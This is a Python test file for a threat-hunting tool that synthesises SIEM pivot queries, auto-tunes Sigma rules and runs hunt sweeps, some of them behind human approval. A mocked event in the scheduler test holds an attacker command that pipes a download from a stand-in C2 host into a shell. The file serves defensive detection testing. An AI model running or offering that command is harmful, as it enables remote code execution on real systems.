"""Tests for Phase 3: Autonomous Pivot Execution Engine & Rule Self-Tuning."""

from __future__ import annotations

from pathlib import Path
from unittest.mock import MagicMock

from typer.testing import CliRunner

from hecate_runner import cli
from hecate_runner.config import Settings
from hecate_runner.execution.pivot_engine import (
    PivotExecutionEngine,
    synthesize_pivot_queries,
)
from hecate_runner.execution.safe_gate import SafeExecutionGate
from hecate_runner.execution.scheduler import HuntExecutionScheduler
from hecate_runner.execution.triage_agent import FindingTriageReport
from hecate_runner.execution.watermark_store import WatermarkStore
from hecate_runner.lifecycle import get_hunt_lifecycle
from hecate_runner.query_execution import MockQueryProvider, QueryResult
from hecate_runner.rule_tuner import RuleTuner
from hecate_runner.slack_sim import SlackBotSimulator

SAMPLE_HUNT_MARKDOWN = """---
id: H-0021
title: Adversaries Deploy Malicious Node-RED Flows
hypothesis: Adversaries deploy unauthenticated Node-RED flows to gain remote execution.
status: active
cadence: daily
techniques:
  - T1190
  - T1059.004
date: 2026-11-09
---

## HYPOTHESIZE: State the Threat
Adversaries target exposed IoT management runtimes.

## ACT: Execute and Conclude
"""

SAMPLE_SIGMA_RULE = """title: Suspicious Node-RED Child Shell
id: 11111111-2222-3333-4444-555555555555
status: test
description: Detects child shell execution spawned by node-red
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        ParentImage|endswith:
            - '/node-red'
            - '/node'
        Image|endswith:
            - '/bin/sh'
            - '/bin/bash'
    condition: selection
level: high
"""


def _setup_mock_workspace(tmp_path: Path) -> Path:
    ws = tmp_path / "Hecate-Public"
    hunts_dir = ws / "hunts" / "active"
    hunts_dir.mkdir(parents=True, exist_ok=True)
    (hunts_dir / "H-0021.md").write_text(SAMPLE_HUNT_MARKDOWN, encoding="utf-8")

    query_dir = ws / "queries" / "H-0021"
    query_dir.mkdir(parents=True, exist_ok=True)
    (query_dir / "rule.yml").write_text(SAMPLE_SIGMA_RULE, encoding="utf-8")
    (query_dir / "splunk_spl.spl").write_text(
        'index=edr parent_process="node-red" process="/bin/sh"', encoding="utf-8"
    )
    return ws


# --- Pivot Synthesis Tests ----------------------------------------------------


def test_synthesize_pivot_queries_splunk() -> None:
    entities = {
        "hosts": ["srv-app-01"],
        "processes": ["/bin/sh"],
        "parent_processes": ["node-red"],
        "users": ["nodered"],
        "ips": ["203.0.113.88"],
    }
    pivots = synthesize_pivot_queries("splunk", entities, techniques=["T1190"])
    assert len(pivots) == 3

    types = [p["type"] for p in pivots]
    assert "child_process" in types
    assert "network_egress" in types
    assert "user_auth" in types

    child_p = next(p for p in pivots if p["type"] == "child_process")
    assert 'parent_process="*sh"' in child_p["query"]
    assert 'host="srv-app-01"' in child_p["query"]
    assert child_p["technique"] == "T1059"

    net_p = next(p for p in pivots if p["type"] == "network_egress")
    assert 'dest_ip="203.0.113.88"' in net_p["query"]
    assert net_p["technique"] == "T1071"


def test_synthesize_pivot_queries_sentinel() -> None:
    entities = {
        "hosts": ["workstation-99"],
        "processes": ["powershell.exe"],
        "users": ["alice"],
    }
    pivots = synthesize_pivot_queries("sentinel", entities)
    assert len(pivots) >= 2

    child_p = next(p for p in pivots if p["type"] == "child_process")
    assert "DeviceProcessEvents" in child_p["query"]
    assert 'DeviceName =~ "workstation-99"' in child_p["query"]
    assert 'InitiatingProcessFileName =~ "powershell.exe"' in child_p["query"]

    net_p = next(p for p in pivots if p["type"] == "network_egress")
    assert "DeviceNetworkEvents" in net_p["query"]


def test_synthesize_pivot_queries_elastic() -> None:
    entities = {
        "hosts": ["prod-db-01"],
        "processes": ["curl"],
        "parent_processes": ["httpd"],
    }
    pivots = synthesize_pivot_queries("elastic", entities)
    child_p = next(p for p in pivots if p["type"] == "child_process")
    assert 'host.name: "prod-db-01"' in child_p["query"]
    assert 'process.parent.name: "*curl"' in child_p["query"]


# --- Pivot Execution Engine Tests --------------------------------------------


def test_pivot_execution_engine(tmp_path: Path) -> None:
    db_path = tmp_path / "watermarks.db"
    store = WatermarkStore(db_path=db_path)

    # Record initial finding
    finding_report = FindingTriageReport(
        hunt_id="H-0021",
        sweep_id="SWEEP-H-0021-001",
        target_siem="splunk",
        verdict="true_positive",
        confidence=0.92,
        summary="Malicious Node-RED child shell execution",
        rationale="Unauthenticated flow spawned curl cradle",
        recommended_action="escalate_to_soc",
        event_count=1,
        extracted_entities={
            "hosts": ["iot-edge-01"],
            "processes": ["/bin/sh"],
            "ips": ["198.51.100.99"],
        },
    )
    finding_id = store.record_finding(finding_report)

    # Mock SafeExecutionGate
    mock_provider = MagicMock()
    mock_provider.name = "splunk"
    # First query has 2 hits, second query has 0
    mock_provider.execute.side_effect = [
        QueryResult(
            outcome="executed",
            provider="splunk",
            row_count=1,
            events=[{"count": 2}],
            detail="",
            executed_at="2026-11-09T12:00:00Z",
        ),
        QueryResult(
            outcome="executed",
            provider="splunk",
            row_count=2,
            events=[{"dest_ip": "198.51.100.99", "bytes": 1024}],
            detail="",
            executed_at="2026-11-09T12:00:01Z",
        ),
        QueryResult(
            outcome="executed",
            provider="splunk",
            row_count=1,
            events=[{"count": 0}],
            detail="",
            executed_at="2026-11-09T12:00:02Z",
        ),
    ]

    gate = SafeExecutionGate(provider=mock_provider)
    engine = PivotExecutionEngine(gate=gate, store=store)

    results = engine.execute_pivots(
        finding_id=finding_id,
        hunt_id="H-0021",
        target_siem="splunk",
        entities=finding_report.extracted_entities,
        max_pivots=2,
    )

    assert len(results) == 2
    # Verify first pivot detected hits
    assert results[0].outcome == "hits_detected"
    assert results[0].matched_count == 2
    # Verify second pivot was clean
    assert results[1].outcome == "clean"
    assert results[1].matched_count == 0

    # Verify findings ledger has attached pivots
    updated = store.get_finding(finding_id)
    assert updated is not None
    assert len(updated["pivots"]) == 2
    assert updated["pivots"][0]["outcome"] == "hits_detected"


# --- Rule Self-Tuning Tests --------------------------------------------------


def test_rule_tuner_auto_tune_from_finding(tmp_path: Path) -> None:
    ws = _setup_mock_workspace(tmp_path)
    tuner = RuleTuner(workspace=ws)

    finding = {
        "finding_id": "FINDING-H-0021-test",
        "hunt_id": "H-0021",
        "verdict": "benign_noise",
        "extracted_entities": {
            "users": ["svc_ansible_worker"],
            "processes": ["/bin/sh"],
        },
    }

    res = tuner.auto_tune_from_finding(finding)
    assert res.ok
    assert "svc_ansible_worker" in res.action_summary
    assert res.rule_file is not None

    updated_rule = res.rule_file.read_text(encoding="utf-8")
    assert "svc_ansible_worker" in updated_rule
    assert "and not" in updated_rule


# --- Closed-Loop Scheduler Integration with Pivots ----------------------------


def test_scheduler_closed_loop_pivot_execution(tmp_path: Path) -> None:
    ws = _setup_mock_workspace(tmp_path)
    db_path = tmp_path / "watermarks.db"
    settings = Settings(
        hecate_workspace=ws,
        hunt_executions_db=db_path,
        auto_hunt_pivots_enabled=True,
    )

    mock_provider = MagicMock()
    mock_provider.name = "splunk"
    mock_provider.execute.return_value = QueryResult(
        outcome="executed",
        provider="splunk",
        row_count=1,
        events=[
            {
                "time": "2026-11-09T12:00:00Z",
                "host": "iot-edge-01",
                "user": "nodered",
                "process": "/bin/sh",
                "parent": "node-red",
                "command": "curl -s http://c2.bad/stage | sh",
                "dest_ip": "203.0.113.5",
            }
        ],
        detail="",
        executed_at="2026-11-09T12:00:00Z",
    )

    scheduler = HuntExecutionScheduler(
        settings=settings,
        provider=mock_provider,
    )

    res = scheduler.execute_sweep("H-0021")
    assert res.ok
    assert res.triage_report is not None
    assert res.triage_report.verdict in ("true_positive", "suspicious")
    assert len(res.pivot_results) >= 1

    # Check Markdown synchronization
    hunt_file = ws / "hunts" / "active" / "H-0021.md"
    body = hunt_file.read_text(encoding="utf-8")
    assert "#### Automated Investigation Pivots" in body
    assert "T1059" in body
    assert "pivots_executed:" in body

    # Check Lifecycle
    lifecycle = get_hunt_lifecycle(ws, "H-0021")
    assert lifecycle["is_active"]


# --- Slack Simulation Tuning Action Test -------------------------------------


def test_slack_simulation_auto_tune_action(tmp_path: Path) -> None:
    ws = _setup_mock_workspace(tmp_path)
    db_path = tmp_path / "watermarks.db"
    settings = Settings(
        hecate_workspace=ws,
        hunt_executions_db=db_path,
    )

    store = WatermarkStore(db_path=db_path)
    finding_report = FindingTriageReport(
        hunt_id="H-0021",
        sweep_id="SWEEP-H-0021-002",
        target_siem="splunk",
        verdict="benign_noise",
        confidence=0.85,
        summary="Scheduled system backup run",
        rationale="cron spawned sh to run daily backup",
        recommended_action="tune_rule",
        event_count=1,
        extracted_entities={
            "parent_processes": ["cron"],
            "processes": ["/bin/sh"],
        },
    )
    finding_id = store.record_finding(finding_report)

    sim = SlackBotSimulator(settings=settings)
    out = sim.simulate_action(
        action_id="hecate_tune_finding",
        value=finding_id,
        user="analyst_bob",
    )

    assert out["ok"]
    assert "Tuned for `H-0021`" in out["message"]

    # Verify DB status updated
    updated_f = store.get_finding(finding_id)
    assert updated_f is not None
    assert updated_f["tuning_status"] == "tuned"


# --- CLI Commands Test -------------------------------------------------------


def test_cli_sweep_pivots_and_tune(tmp_path: Path) -> None:
    ws = _setup_mock_workspace(tmp_path)
    db_path = tmp_path / "watermarks.db"

    store = WatermarkStore(db_path=db_path)
    finding_report = FindingTriageReport(
        hunt_id="H-0021",
        sweep_id="SWEEP-H-0021-003",
        target_siem="splunk",
        verdict="benign_noise",
        confidence=0.80,
        summary="Health check execution",
        rationale="Nagios check execution",
        recommended_action="tune_rule",
        event_count=1,
        extracted_entities={
            "users": ["nagios"],
            "processes": ["/bin/sh"],
        },
    )
    finding_id = store.record_finding(finding_report)

    # Attach a simulated pivot
    store.update_finding_pivots(
        finding_id=finding_id,
        pivots=[
            {
                "pivot_id": "PIVOT-001",
                "pivot_type": "child_process",
                "technique": "T1059",
                "outcome": "clean",
                "matched_count": 0,
                "query_text": 'index=* parent_process="*sh"',
            }
        ],
    )

    runner = CliRunner()
    env = {
        "HECATE_WORKSPACE": str(ws),
        "HECATE_HUNT_EXECUTIONS_DB": str(db_path),
        "COLUMNS": "180",
    }

    # 1. Inspect pivots via CLI
    res_pivots = runner.invoke(
        cli.app,
        ["sweep", "pivots", finding_id],
        env=env,
    )
    assert res_pivots.exit_code == 0, res_pivots.output
    assert "PIVOT-001" in res_pivots.output
    assert "child_process" in res_pivots.output

    # 2. Tune rule via CLI
    res_tune = runner.invoke(
        cli.app,
        ["sweep", "tune", finding_id],
        env=env,
    )
    assert res_tune.exit_code == 0, res_tune.output
    assert "Successfully Tuned Detection Rule" in res_tune.output
    assert "nagios" in res_tune.output


def test_scheduler_run_scheduled_sweeps(tmp_path: Path) -> None:
    ws = _setup_mock_workspace(tmp_path)
    db_path = tmp_path / "watermarks.db"

    # Case 1: HITL approval required -> returns StagedSweep
    settings_hitl = Settings(
        hecate_workspace=ws,
        hunt_executions_db=db_path,
        auto_hunt_execution_enabled=True,
        auto_hunt_approval_required=True,
    )
    mock_prov = MockQueryProvider(responses=[0])
    scheduler_hitl = HuntExecutionScheduler(settings=settings_hitl, provider=mock_prov)
    staged = scheduler_hitl.run_scheduled_sweeps(force=True)
    assert len(staged) == 1
    assert staged[0].status == "pending_approval"

    # Case 2: Autonomous execution (no approval required) -> executes sweep
    settings_auto = Settings(
        hecate_workspace=ws,
        hunt_executions_db=db_path,
        auto_hunt_execution_enabled=True,
        auto_hunt_approval_required=False,
    )
    scheduler_auto = HuntExecutionScheduler(settings=settings_auto, provider=mock_prov)
    executed = scheduler_auto.run_scheduled_sweeps(force=True)
    assert len(executed) == 1
    assert executed[0].outcome == "clean"


def test_cli_sweep_daemon(tmp_path: Path) -> None:
    ws = _setup_mock_workspace(tmp_path)
    db_path = tmp_path / "watermarks.db"

    runner = CliRunner()
    env = {
        "HECATE_WORKSPACE": str(ws),
        "HECATE_HUNT_EXECUTIONS_DB": str(db_path),
        "HECATE_AUTO_HUNT_EXECUTION_ENABLED": "true",
        "COLUMNS": "180",
    }

    res = runner.invoke(
        cli.app,
        ["sweep", "daemon", "--max-cycles", "1", "--interval", "1", "--force"],
        env=env,
    )
    assert res.exit_code == 0, res.output
    assert "Starting Hecate Hunt Sweep Daemon" in res.output
    assert "Sweep daemon exited cleanly after 1 cycles." in res.output
